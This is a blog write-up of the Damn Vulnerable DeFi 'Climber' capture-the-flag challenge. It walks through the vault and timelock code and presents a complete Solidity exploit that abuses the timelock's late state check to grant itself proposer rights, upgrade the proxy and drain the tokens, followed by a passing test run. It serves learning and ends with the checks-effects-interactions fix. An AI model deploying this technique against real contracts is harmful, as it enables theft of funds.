@@ -1,0 +1,338 @@
+# Damn Vulnerable DeFi V2 - #12 Climber
+
+<p className="text-xs text-right">June 29, 2022 by [patrickd](/about#patrickd)</p>
+
+This is the ~~final~~ part 9 of the write-up series on Damn Vulnerable DeFi V2. Please consider attempting to solve it on your own first since it's a lot less fun after being spoiled!
+
+---
+
+>[**Challenge #12 - Climber**](https://www.damnvulnerabledefi.xyz/challenges/12.html)
+>
+>There's a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the [UUPS pattern](https://eips.ethereum.org/EIPS/eip-1822).
+>
+>The owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days.
+>
+>On the vault there's an additional role with powers to sweep all tokens in case of an emergency.
+>
+>On the timelock, only an account with a "Proposer" role can schedule actions that can be executed 1 hour later.
+>
+>Your goal is to empty the vault.
+
+An UUPS proxy.. maybe we can write into the special storage slot and overwrite the Logic Contract's location? Or maybe it's possible to trigger an emergency that allows us to drain the Vault? Maybe we can become a proposer and schedule a malicious action?
+
+## Code Review
+
+As usual, we start by looking at the scenario setup and success conditions that can be found in [*climber.challenge.js*](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.1.0/test/climber/climber.challenge.js).
+
+```javascript
+await ethers.provider.send("hardhat_setBalance", [
+    attacker.address,
+    "0x16345785d8a0000", // 0.1 ETH
+]);
+```
+
+Normally the accounts that tests get from `ethers.getSigners()` have a balance of 10.000 ether, but in this case it's ensured that the attacker account only has 0.1 ether available...
+
+```javascript
+this.vault = await upgrades.deployProxy(
+    await ethers.getContractFactory('ClimberVault', deployer),
+    [ deployer.address, proposer.address, sweeper.address ],
+    { kind: 'uups' }
+);
+```
+
+As the challenge teased, the Vault is indeed deployed behind a UUPS proxy. In case you're wondering, the array items `deployer`, `proposer`, and `sweeper` are the function arguments that are passed to the contract during initialization.
+
+```javascript
+let timelockAddress = await this.vault.owner();
+this.timelock = await (
+    await ethers.getContractFactory('ClimberTimelock', deployer)
+).attach(timelockAddress);
+```
+
+This part is simply making the Timelock available to us within the tests. The `ClimberTimelock` contract itself appears to be deployed as part of the construction of `ClimberVault`.
+
+And finally, the DVT Token contract is deployed and 10 million of them are transferred into the Vault. That's it for the setup.
+
+The success conditions aren't much to speak of either:
+
+```javascript
+expect(await this.token.balanceOf(this.vault.address)).to.eq('0');
+expect(await this.token.balanceOf(attacker.address)).to.eq(VAULT_TOKEN_BALANCE);
+```
+
+As expected, we just have to move all of the tokens to the attacker's account.
+
+---
+
+Let's look at [`ClimberVault`](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.1.0/contracts/climber/ClimberVault.sol) next since it seems to create `ClimberTimelock`.
+
+First of all the comment `Upgrades are to be triggered by the owner.` pops into my eyes and makes me wonder: Oh? Are they now? Is this a hint?
+
+Now I previously said that the Timelock contract appears to be deployed during the construction of the Vault - but the constructor is actually empty and there's a function called `initialize` instead. That's because you can't, or rather, you shouldn't make use of constructors in contracts that are behind a proxy. Constructors in Solidity are commonly used to initialize a contract's state, but it wouldn't make much sense to initialize the state of the Logic Contract since the state that will actually be used is the Proxy's. So all the constructor of the Logic Contract does is mark itself as initialized so nobody can trigger initialization on it directly. And instead, taken care automatically by `upgrades.deployProxy()`, the `initialize` function is called on the `Proxy` contract that delegate-calls into the Logic Contract. After that, the Proxy should be properly initialized according to the Logic Contract's needs.
+
+Note also that the proxy couldn't call into the `constructor` of the Logic Contract to do this since it's not part of the runtime bytecode - constructors are executed once, during the deployment of the contract and in fact they return the runtime bytecode, they're not part of it.
+
+```solidity
+function initialize(address admin, address proposer, address sweeper) initializer external {
+    // Initialize inheritance chain
+    __Ownable_init();
+    __UUPSUpgradeable_init();
+```
+
+Solidity normally takes care of inheritance and calling the constructors in the correct order but there's no such thing for initialize, therefore the `initialize` function starts with a list of other `init` functions that need to be called. Last time I checked there's no tool to help with doing that making this step error-prone and cumbersome.
+
+A quick way to check for correctness, in this case, could be [OpenZeppelin's Contracts Wizard](https://docs.openzeppelin.com/contracts/4.x/wizard). Here we can get an automatically generated UUPS Proxied/Upgradable contract that is also Ownable and see that the order of `init` calls seems to be correct and complete.
+
+```solidity
+transferOwnership(address(new ClimberTimelock(admin, proposer)));
+```
+
+As expected, here the `ClimberTimelock` contract is being deployed as part of `ClimberVault`'s initialization. Since by default the ownership is given to the current `msg.sender`, it needs to be transferred to the Timelock here.
+
+```solidity
+_setLastWithdrawal(block.timestamp);
+```
+
+Finally, the timestamp of the last withdrawal is set to the current time (or rather the timestamp contained in the current block set by its miner). This is probably to prevent the owner from being able to immediately make a withdrawal without 15 days passing first.
+
+```solidity
+function withdraw(address tokenAddress, address recipient, uint256 amount) external onlyOwner {
+    require(amount <= WITHDRAWAL_LIMIT, "Withdrawing too much");
+    require(block.timestamp > _lastWithdrawalTimestamp + WAITING_PERIOD, "Try later");
+    _setLastWithdrawal(block.timestamp);
+```
+
+The `withdraw` function allows getting up to 1 Token every 15 days out of the Vault - and I don't really see a way around that here so let's instead look at the "emergency" sweeping function:
+
+```solidity
+function sweepFunds(address tokenAddress) external onlySweeper {
+    IERC20 token = IERC20(tokenAddress);
+    require(token.transfer(_sweeper, token.balanceOf(address(this))), "Transfer failed");
+}
+```
+
+Apparently, the EOA that was declared to be the "sweeper" can just freely decide whether there's an emergency or not. Naturally, we don't have their private keys, so most likely we'll need some way to overwrite who the sweeper is, but I don't see a way to do that in this contract.
+
+---
+
+I now expect to find some kind of issue in the [`ClimberTimelock`](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.1.0/contracts/climber/ClimberTimelock.sol) contract that allows us to upgrade the Logic Contract to whatever we tell it to...
+
+The Timelock makes use of OpenZeppelin's [`AccessControl`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/AccessControl.sol) contract to have a role-based access control.
+
+```solidity
+constructor(
+    address admin,
+    address proposer
+) {
+    _setRoleAdmin(ADMIN_ROLE, ADMIN_ROLE);
+    _setRoleAdmin(PROPOSER_ROLE, ADMIN_ROLE);
+
+    // deployer + self administration
+    _setupRole(ADMIN_ROLE, admin);
+    _setupRole(ADMIN_ROLE, address(this));
+
+    _setupRole(PROPOSER_ROLE, proposer);
+}
+```
+
+What I find quite interesting is, that the Timelock contract itself is added as an administrator. Although the `ADMIN_ROLE` is seemingly unused in the Timelock, there are actually several public functions that it's inheriting from `AccessControl`, most importantly: `grantRole(bytes32 role, address account)`. So it should be possible to grant roles via a proposal, since they are executed by this contract which is an admin.
+
+```solidity
+function schedule(
+    address[] calldata targets,
+    uint256[] calldata values,
+    bytes[] calldata dataElements,
+    bytes32 salt
+) external onlyRole(PROPOSER_ROLE) {
+```
+
+While the `schedule` function can only be called by proposers the `execute` function has an interesting comment:
+
+```solidity
+/** Anyone can execute what has been scheduled via `schedule` */
+function execute(
+    address[] calldata targets,
+    uint256[] calldata values,
+    bytes[] calldata dataElements,
+    bytes32 salt
+) external payable {
+    require(targets.length > 0, "Must provide at least one target");
+    require(targets.length == values.length);
+    require(targets.length == dataElements.length);
+
+    bytes32 id = getOperationId(targets, values, dataElements, salt);
+
+    for (uint8 i = 0; i < targets.length; i++) {
+        targets[i].functionCallWithValue(dataElements[i], values[i]);
+    }
+
+    require(getOperationState(id) == OperationState.ReadyForExecution);
+    operations[id].executed = true;
+}
+```
+
+Although this function does indeed check that the operation state of a given ID must be `ReadyForExecution`, it does so *after* executing the function calls. That means we're free to do all the calls we want as long as we ensure that at the end of them there is an operation that is actually marked as `ReadyForExecution`.
+
+So we know that, since the contract is an admin, we can simply grant us the `PROPOSER_ROLE` as well and then schedule the proposal we're already executing before the operation state check is made. But what about getting the operation into the ready state that requires a 1-hour delay?
+
+```solidity
+function updateDelay(uint64 newDelay) external {
+    require(msg.sender == address(this), "Caller must be timelock itself");
+    require(newDelay <= 14 days, "Delay must be 14 days or less");
+    delay = newDelay;
+}
+```
+
+Well, apparently we can just get rid of the delay before creating the proposal and have it ready immediately.
+
+[EDIT: On Discord [silent_mastodon#1304](https://discord.com/channels/814328279468474419/887889071446310933/991763920916336710) noted that it's actually unnecessary to update the delay at all since there's a subtle error in the [_getOperationState_ function](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.1.0/contracts/climber/ClimberTimelock.sol#L56)]
+
+---
+
+In Summary, we have to execute a proposal that doesn't exist and make sure that at the end of its execution it does exist after all and was ready to be executed. If we manage this we've basically taken control of the owner of the Vault.
+
+But in order to drain all of the tokens at once, we need to be the sweeper, and there's currently no external function that allows changing who that is after initialization. Good thing though that, as the owner, we're able to upgrade the Logic Contract to whatever we want!
+
+And we do that by calling `upgradeTo(address newImplementation)` which is a function that `ClimberVault` inherits from [UUPSUpgradeable](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/utils/UUPSUpgradeable.sol).
+
+## Exploit
+
+```solidity showLineNumbers filename="ClimberExploit.sol" copy
+contract ClimberExploit is UUPSUpgradeable {
+    ClimberTimelock immutable timelock;
+    address immutable vaultProxyAddress;
+    IERC20 immutable token;
+    address immutable attacker;
+
+    constructor(
+        ClimberTimelock _timelock,
+        address _vaultProxyAddress,
+        IERC20 _token
+    ) {
+        timelock = _timelock;
+        vaultProxyAddress = _vaultProxyAddress;
+        token = _token;
+        attacker = msg.sender;
+    }
+
+    function buildProposal() internal returns (address[] memory, uint256[] memory, bytes[] memory) {
+        address[] memory targets = new address[](5);
+        uint256[] memory values = new uint256[](5);
+        bytes[] memory dataElements = new bytes[](5);
+
+        // Update delay to 0.
+        targets[0] = address(timelock);
+        values[0] = 0;
+        dataElements[0] = abi.encodeWithSelector(
+            ClimberTimelock.updateDelay.selector,
+            0
+        );
+
+        // Grant this contract the proposer role.
+        targets[1] = address(timelock);
+        values[1] = 0;
+        dataElements[1] = abi.encodeWithSelector(
+            AccessControl.grantRole.selector,
+            timelock.PROPOSER_ROLE(),
+            address(this)
+        );
+
+        // Call this contract to schedule the proposal.
+        targets[2] = address(this);
+        values[2] = 0;
+        dataElements[2] = abi.encodeWithSelector(
+            ClimberExploit.scheduleProposal.selector
+        );
+
+        // Upgrade the Proxy to use this contract as implementation instead.
+        targets[3] = address(vaultProxyAddress);
+        values[3] = 0;
+        dataElements[3] = abi.encodeWithSelector(
+            UUPSUpgradeable.upgradeTo.selector,
+            address(this)
+        );
+
+        // Now sweep the funds!
+        targets[4] = address(vaultProxyAddress);
+        values[4] = 0;
+        dataElements[4] = abi.encodeWithSelector(
+            ClimberExploit.sweepFunds.selector
+        );
+
+        return (targets, values, dataElements);
+    }
+
+    // Start exploit by executing a proposal that makes us a proposer.
+    function executeProposal() external {
+        (
+            address[] memory targets,
+            uint256[] memory values,
+            bytes[] memory dataElements
+        ) = buildProposal();
+        timelock.execute(targets, values, dataElements, 0);
+    }
+
+    // Timelock calls this while proposal is still being executed but we
+    // are a proposer now and can schedule it to make it legit.
+    function scheduleProposal() external {
+        (
+            address[] memory targets,
+            uint256[] memory values,
+            bytes[] memory dataElements
+        ) = buildProposal();
+        timelock.schedule(targets, values, dataElements, 0);
+    }
+
+    // Once this contract became the Vault Proxy's new Logic Contract
+    // this function will be called to move all tokens to the attacker.
+    function sweepFunds() external {
+        token.transfer(attacker, token.balanceOf(address(this)));
+    }
+
+    // Required function for inheriting from UUPSUpgradeable.
+    function _authorizeUpgrade(address newImplementation) internal override {}
+}
+```
+
+Normally when you want to upgrade a contract you want to do so while extending the old one. So the "proper way" would've been to create a `contract ClimberVaultV2 is ClimberVault`. The reason for doing so is that it ensures that the storage slot variables must stay aligned. If the `ClimberExploit` contract had any storage variables they would likely clash with the storage variables of `ClimberVault`. But we didn't need any storage variables in the exploit and we don't really care if we brick the Vault by replacing it with an entirely different contract, we just take the tokens and run!
+
+Adjusting [*climber.challenge.js*](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.1.0/test/climber/climber.challenge.js)...
+
+```javascript
+it('Exploit', async function () {
+    const ExploitFactory = await ethers.getContractFactory('ClimberExploit', attacker);
+    const exploit = await ExploitFactory.deploy(
+        this.timelock.address,
+        this.vault.address,
+        this.token.address
+    );
+    await exploit.executeProposal();
+});
+```
+
+Aaaand...
+
+```
+patrickd@damnvulndefi:~/damn-vulnerable-defi$ yarn run climber
+yarn run v1.22.17
+$ yarn hardhat test test/climber/climber.challenge.js
+$ /home/patrickd/damn-vulnerable-defi/node_modules/.bin/hardhat test test/climber/climber.challenge.js
+Compiling 1 file with 0.8.7
+Compilation finished successfully
+
+
+  [Challenge] Climber
+    ✓ Exploit (805ms)
+
+
+  1 passing (3s)
+
+Done in 4.88s.
+```
+
+---
+
+This exploit was really fun to put together! At first, I tried making the Timelock Contract the proposer instead and _schedule_-call within the operations, but I abandoned it soon since I got a headache from infinite recursion.
+
+Although it's not your textbook "reentrancy" vulnerability, it could in fact have been prevented by following the [checks-effects-interactions](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html) pattern in the Timelock's `execute` function.
